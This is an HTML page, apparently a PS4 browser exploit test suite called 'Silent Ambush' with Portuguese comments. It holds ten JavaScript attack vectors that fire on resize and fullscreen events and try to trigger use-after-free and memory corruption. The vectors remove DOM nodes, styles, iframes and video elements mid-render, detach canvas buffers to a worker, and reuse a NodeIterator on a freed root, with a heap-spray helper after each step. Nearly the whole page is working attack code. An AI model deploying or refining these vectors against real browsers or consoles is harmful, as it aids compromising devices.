<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v210000: Silent Ambush</title>
<style>
    body { background-color: #111; color: #fff; font-family: sans-serif; padding: 20px; text-align: center; overflow: hidden; }
    h1 { color: #f55; margin-bottom: 20px; }
    
    #status { 
        border: 2px solid #555; background: #000; color: #aaa; 
        padding: 15px; font-size: 18px; font-weight: bold; margin-bottom: 20px;
    }
    
    .trap-btn { 
        display: block; width: 100%; padding: 15px; margin: 8px 0; 
        background: #333; color: #fff; border: 1px solid #777; 
        font-size: 16px; cursor: pointer;
    }
    .trap-btn:hover { background: #555; }
    
    .armed { background: #900 !important; border-color: #f00 !important; color: #fff !important; }

    /* O Alvo Visual */
    #stage { 
        width: 80%; height: 100px; margin: 0 auto; 
        background: #222; border: 1px dashed #444; 
        display: flex; align-items: center; justify-content: center;
    }
</style>
</head>
<body>

<h1>v210000: SILENT AMBUSH</h1>

<div id="status">PASSO 1: Selecione um vetor abaixo.</div>

<div id="stage">ALVO INATIVO</div>

<button class="trap-btn" onclick="arm(t01)">01. Resize Event -> DOM Nuke</button>
<button class="trap-btn" onclick="arm(t02)">02. CSS Media Query -> Style Detach</button>
<button class="trap-btn" onclick="arm(t03)">03. FullscreenChange -> Iframe Kill</button>
<button class="trap-btn" onclick="arm(t04)">04. RequestAnimationFrame -> Layout Thrash</button>
<button class="trap-btn" onclick="arm(t05)">05. Video Player -> Source Confusion</button>
<button class="trap-btn" onclick="arm(t06)">06. Resize -> Canvas Buffer Transfer</button>
<button class="trap-btn" onclick="arm(t07)">07. FullscreenChange -> History Flood</button>
<button class="trap-btn" onclick="arm(t08)">08. Resize -> SVG ViewBox Invalid</button>
<button class="trap-btn" onclick="arm(t09)">09. MatchMedia -> NodeIterator UAF</button>
<button class="trap-btn" onclick="arm(t10)">10. Resize -> Heavy Calculation (Stack)</button>

<script>
    const S = document.getElementById('status');
    const Stage = document.getElementById('stage');
    let currentTrap = null;

    function arm(trapFunc) {
        // Reset visual
        document.querySelectorAll('button').forEach(b => b.classList.remove('armed'));
        event.target.classList.add('armed');
        
        // Limpa listeners antigos para não conflitar
        window.onresize = null;
        document.onwebkitfullscreenchange = null;
        document.onfullscreenchange = null;
        
        // 1. Prepara o Palco
        Stage.innerHTML = "";
        Stage.style.display = "flex";
        
        // Executa a configuração do vetor
        const payload = trapFunc(Stage);
        
        S.innerHTML = "PASSO 2: APERTE QUADRADO (FULLSCREEN) AGORA!";
        S.style.color = "#ff0";
        S.style.borderColor = "#ff0";
    }

    // Função auxiliar para ocupar memória rapidamente (Heap Spray)
    function spray() {
        const arr = [];
        for(let i=0; i<2000; i++) arr.push(new Uint8Array(4096).fill(0x41));
    }

    // =================================================================
    // 01. Resize Event -> DOM Nuke
    // O evento resize dispara assim que a resolução muda, ANTES do repaint.
    // =================================================================
    function t01(stage) {
        stage.innerHTML = "<h1 style='color:red'>ALVO RESIZE</h1>";
        
        // Gatilho: Assim que a tela mudar de tamanho...
        window.onresize = () => {
            S.innerText = "AMBUSH: REMOVING BODY...";
            document.body.innerHTML = ""; // Apaga tudo
            spray();
            document.write("CRASH?");
        };
    }

    // =================================================================
    // 02. CSS Media Query -> Style Detach
    // Usa matchMedia para detectar a mudança de aspecto da tela.
    // =================================================================
    function t02(stage) {
        stage.innerHTML = "<div class='victim' style='width:100px;height:100px;background:blue'></div>";
        const style = document.createElement('style');
        style.textContent = ".victim { transform: rotate(0deg); transition: all 1s; }";
        document.head.appendChild(style);

        const mql = window.matchMedia("(display-mode: fullscreen)");
        
        // Gatilho via listener de media query
        mql.addListener(() => {
            S.innerText = "AMBUSH: STYLE DETACH...";
            style.remove(); // Remove as regras CSS durante a renderização
            stage.innerHTML = ""; // Remove o elemento
            spray();
        });
    }

    // =================================================================
    // 03. FullscreenChange -> Iframe Kill
    // Usa o evento específico de mudança de modo de tela.
    // =================================================================
    function t03(stage) {
        const ifr = document.createElement('iframe');
        ifr.src = "about:blank";
        ifr.style.width = "100%"; ifr.style.height = "100%";
        stage.appendChild(ifr);

        const trigger = () => {
            S.innerText = "AMBUSH: IFRAME KILL...";
            ifr.remove(); // Mata o iframe
            spray();
        };
        
        document.onwebkitfullscreenchange = trigger;
        document.onfullscreenchange = trigger;
    }

    // =================================================================
    // 04. RequestAnimationFrame -> Layout Thrash
    // Loop constante que monitora a largura da tela.
    // Mais rápido que o evento resize em alguns casos.
    // =================================================================
    function t04(stage) {
        stage.innerHTML = "<div>LAYOUT MONITOR</div>";
        let lastWidth = window.innerWidth;
        
        function loop() {
            if (window.innerWidth !== lastWidth) {
                // Detecção de mudança
                S.innerText = "AMBUSH: LAYOUT THRASH...";
                stage.remove(); // Remove o palco
                // Força layout síncrono em elemento morto
                const h = stage.offsetHeight; 
                spray();
                return; // Para o loop
            }
            requestAnimationFrame(loop);
        }
        loop();
    }

    // =================================================================
    // 05. Video Player -> Source Confusion
    // O PS4 pode usar um overlay de vídeo. Detectamos o resize e matamos o vídeo.
    // =================================================================
    function t05(stage) {
        const v = document.createElement('video');
        v.controls = true;
        // Mock source
        v.src = URL.createObjectURL(new Blob([""], {type:'video/mp4'})); 
        stage.appendChild(v);
        
        window.onresize = () => {
            S.innerText = "AMBUSH: VIDEO KILL...";
            v.src = "";
            v.load();
            v.remove();
            spray();
        };
    }

    // =================================================================
    // 06. Resize -> Canvas Buffer Transfer
    // =================================================================
    function t06(stage) {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        ctx.fillRect(0,0,300,150);
        stage.appendChild(c);
        
        const imgData = ctx.getImageData(0,0,300,150);
        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{}"],{type:'text/javascript'})));

        window.onresize = () => {
            S.innerText = "AMBUSH: BUFFER DETACH...";
            // Transfere a memória da imagem para o worker (invalida no main thread)
            w.postMessage(imgData.data.buffer, [imgData.data.buffer]);
            // Tenta redesenhar no canvas com buffer inválido
            ctx.putImageData(imgData, 0, 0);
        };
    }

    // =================================================================
    // 07. FullscreenChange -> History Flood
    // Tenta navegar loucamente no histórico durante a transição.
    // =================================================================
    function t07(stage) {
        history.pushState({}, "p1", "#p1");
        
        const trigger = () => {
            S.innerText = "AMBUSH: NAVIGATING...";
            // Volta e avança rapidamente
            history.back();
            history.forward();
            stage.remove();
        };
        document.onwebkitfullscreenchange = trigger;
        document.onfullscreenchange = trigger;
    }

    // =================================================================
    // 08. Resize -> SVG ViewBox Invalid
    // =================================================================
    function t08(stage) {
        stage.innerHTML = '<svg id="s" width="100" height="100"><rect width="100" height="100" fill="red"/></svg>';
        const s = document.getElementById('s');
        
        window.onresize = () => {
            S.innerText = "AMBUSH: SVG CORRUPTION...";
            s.setAttribute("viewBox", "0 0 0 0");
            s.setAttribute("width", "0");
            s.innerHTML = ""; // Remove rect
            spray();
        };
    }

    // =================================================================
    // 09. MatchMedia -> NodeIterator UAF
    // =================================================================
    function t09(stage) {
        const root = document.createElement('div');
        root.innerHTML = "<span>A</span><span>B</span>";
        stage.appendChild(root);
        const ni = document.createNodeIterator(root);
        ni.nextNode(); // Pointer at A
        
        const mql = window.matchMedia("(min-width: 2000px)"); // Fullscreen triggers resolution change?
        
        // Usamos resize também por garantia
        window.onresize = () => {
            S.innerText = "AMBUSH: ITERATOR UAF...";
            root.remove();
            spray();
            try { ni.nextNode(); } catch(e){} // Use iterator on dead root
        };
    }

    // =================================================================
    // 10. Resize -> Heavy Calculation (Stack)
    // Tenta travar a CPU enquanto a GPU está redimensionando.
    // =================================================================
    function t10(stage) {
        window.onresize = () => {
            S.innerText = "AMBUSH: STACK SMASH...";
            function recurse() { recurse(); }
            try { recurse(); } catch(e){}
        };
    }

</script>
</body>
</html>
